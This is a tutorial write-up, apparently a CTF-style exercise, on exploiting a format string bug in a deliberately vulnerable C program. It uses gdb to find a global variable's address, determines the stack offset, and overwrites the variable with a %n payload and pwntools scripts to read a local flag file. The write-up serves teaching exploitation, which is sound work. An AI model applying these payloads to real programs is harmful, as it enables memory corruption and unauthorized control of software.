### Format String: Variable Value Overwrite


As we already know what format string bug is, we are going to see it in action by overwriting a variable value and changing the flow of the program. The source code of this program is:-

```C
// gcc -m32 -no-pie level2.c -o level2

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_LEN 64
int denyFlag = 0;

int main(int argc, char** argv) 
{
    char buffer[BUF_LEN];

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);

    if(denyFlag){
        puts("Wow, you got it!");
        system("cat ./flag.txt");   
    }else{
        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    }

    return 0;
}
```

We know that we have to overwrite the `denyFlag` in order to read a flag, so to do that we will tae advantage of `%n` specifier to `printf` to write a value to` denyFlag`.

We need to get the address of `denyFlag`, since `PIE` is disabled we will have a static address of the variable `denyFlag`. Let's check the address in `gdb`.

```r

warning: ~/.gdbinit.local: No such file or directory
Reading symbols from level2...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
gef➤  shell subl level2.py
gef➤  i variables 
All defined variables:

Non-debugging symbols:
0x08048718  _fp_hw
0x0804871c  _IO_stdin_used
0x0804879c  __GNU_EH_FRAME_HDR
0x08048890  __FRAME_END__
0x08049f08  __frame_dummy_init_array_entry
0x08049f08  __init_array_start
0x08049f0c  __do_global_dtors_aux_fini_array_entry
0x08049f0c  __init_array_end
0x08049f10  __JCR_END__
0x08049f10  __JCR_LIST__
0x08049f14  _DYNAMIC
0x0804a000  _GLOBAL_OFFSET_TABLE_
0x0804a02c  __data_start
0x0804a02c  data_start
0x0804a030  __dso_handle
0x0804a034  __TMC_END__
0x0804a034  __bss_start
0x0804a034  _edata
0x0804a040  stdin
0x0804a040  stdin@@GLIBC_2.0
0x0804a044  stdout
0x0804a044  stdout@@GLIBC_2.0
0x0804a048  completed
0x0804a04c  denyFlag
0x0804a050  _end
```
So, the address of `denyFlag` is `0x0804a04c` which we have to overwrite. So, in general `%n` tells the number of bytes written so far. But first we need to find out the offset at which our input is getting stored at stack. This is a trial and error method and usually it's not far from the SP(Stack Pointer):-


### Offset Determining

```r
d4mianwayne@oracle:~/Pwning/fmt$ ./level2 
Give me something to say!
AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
AAAA-40-f7f1a5c0-0-0-c30000-0-ff909e94-0-0-0-41414141-2d78252d-252d7825-78252d78-2d78252d
As my friend says,"You get nothing! You lose! Good day, Sir!"

```

So, given `AAAA` is stored at 11. To check it, we can use the `$` specifier to access the specific index.

```r
d4mianwayne@oracle:~/Pwning/fmt$ ./level2 
Give me something to say!
AAAA-%11$p
AAAA-0x41414141
As my friend says,"You get nothing! You lose! Good day, Sir!"
```

So, 11 is the index of the input given, let's move on.

### Pwning

Our payload will look like:-

```r
----------------------------------------
| packed target address | offset '$hn' |
----------------------------------------
```

Let's write the payload to a file named `exp` so we can debug it in `gdb`

Payload: `d4mianwayne@oracle:~/Pwning/fmt$ python -c 'import struct; print(struct.pack("<I", 0x804a04c) + "%11$hn")' > exp `

Running it in `gdb`:-

```r
gef➤  r < exp
Starting program: /home/d4mianwayne/Pwning/fmt/level2 < exp
Give me something to say!
L�
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x5       
$ebx   : 0x0       
$ecx   : 0x5       
$edx   : 0xf7fae890  →  0x00000000
$esp   : 0xffffcf80  →  0x00000000
$ebp   : 0xffffcfe8  →  0x00000000
$esi   : 0xf7fad000  →  0x001d7d6c
$edi   : 0x0       
$eip   : 0x0804863e  →  <main+147> mov eax, ds:0x804a04c
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf80│+0x0000: 0x00000000	 ← $esp
0xffffcf84│+0x0004: 0x00c30000
0xffffcf88│+0x0008: 0x00000000
0xffffcf8c│+0x000c: 0xffffd094  →  0xffffd260  →  "/home/d4mianwayne/Pwning/fmt/level2"
0xffffcf90│+0x0010: 0x00000000
0xffffcf94│+0x0014: 0x00000000
0xffffcf98│+0x0018: 0x00000000
0xffffcf9c│+0x001c: 0x0804a04c  →  0x00000004
───────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048634 <main+137>       mov    ah, 0x50
    0x8048636 <main+139>       call   0x8048420 <printf@plt>
    0x804863b <main+144>       add    esp, 0x10
 →  0x804863e <main+147>       mov    eax, ds:0x804a04c
    0x8048643 <main+152>       test   eax, eax
    0x8048645 <main+154>       je     0x8048669 <main+190>
    0x8048647 <main+156>       sub    esp, 0xc
    0x804864a <main+159>       push   0x804873a
    0x804864f <main+164>       call   0x8048460 <puts@plt>
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "level2", stopped 0x804863e in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804863e → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x5       
$ebx   : 0x0       
$ecx   : 0x5       
$edx   : 0xf7fae890  →  0x00000000
$esp   : 0xffffcf80  →  0x00000000
$ebp   : 0xffffcfe8  →  0x00000000
$esi   : 0xf7fad000  →  0x001d7d6c
$edi   : 0x0       
$eip   : 0x0804863e  →  <main+147> mov eax, ds:0x804a04c
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf80│+0x0000: 0x00000000	 ← $esp
0xffffcf84│+0x0004: 0x00c30000
0xffffcf88│+0x0008: 0x00000000
0xffffcf8c│+0x000c: 0xffffd094  →  0xffffd260  →  "/home/d4mianwayne/Pwning/fmt/level2"
0xffffcf90│+0x0010: 0x00000000
0xffffcf94│+0x0014: 0x00000000
0xffffcf98│+0x0018: 0x00000000
0xffffcf9c│+0x001c: 0x0804a04c  →  0x00000004
───────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048634 <main+137>       mov    ah, 0x50
    0x8048636 <main+139>       call   0x8048420 <printf@plt>
    0x804863b <main+144>       add    esp, 0x10
 →  0x804863e <main+147>       mov    eax, ds:0x804a04c
    0x8048643 <main+152>       test   eax, eax
    0x8048645 <main+154>       je     0x8048669 <main+190>
    0x8048647 <main+156>       sub    esp, 0xc
    0x804864a <main+159>       push   0x804873a
    0x804864f <main+164>       call   0x8048460 <puts@plt>
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "level2", stopped 0x804863e in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804863e → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x0804863e in main ()
gef➤  x/wx 0x0804a04c
0x804a04c <denyFlag>:	0x00000004
gef➤  c
Continuing.
Wow, you got it!
Hello World
[Inferior 1 (process 14257) exited normally]
[*] No debugging session active
```


We have successfully overwritten the `denyFlag` vaue. 

---

##### Understanding The Payload

The payload was `p32(denyFlag_address) + "%11$hn"` and we have written **4** bytes, now we know the usage of `%n`, what we did here is we given the `denyFlag` address and then we used the `%11$hn`to write a byte at that address, the value is **4** because we added a 4 byte address at the start of the exploit.

---

Using `pwntools` to automate it, we can do:-


```python
from pwn import *

target = 0x0804a04c


payload = p32(target)
payload += b"%11$hn"

p = process("./level2")
pause()
p.sendlineafter(b"!\n", payload)
p.interactive()
```

Running the exploit, we can successfully read the flag:-

```r
d4mianwayne@oracle:~/Pwning/fmt$ python3 level2.py 
[+] Starting local process './level2': pid 15685
[*] Switching to interactive mode
L\xa0\x04
Wow, you got it!
Hello World
[*] Process './level2' stopped with exit code 0 (pid 15685)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
d4mianwayne@oracle:~/Pwning/fmt$ cat flag.txt 
Hello World
```

### Alternative Way: Pwntools


There is a function in `pwntools` that will automatic generate a payload if the offset to that address is known:-

```python

from pwn import *

target = 0x0804a04c


#payload = p32(target)
#payload += b"%11$hn"

payload = fmtstr_payload(11, {target: 4})

p = process("./level2")
p.sendlineafter(b"!\n", payload)
p.interactive()


```

Running it:-


```r
d4mianwayne@oracle:~/Pwning/fmt$ python3 level2.py 
[+] Starting local process './level2': pid 15719
[*] Switching to interactive mode
   @L\xa0\x04
Wow, you got it!
Hello World
[*] Process './level2' stopped with exit code 0 (pid 15719)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```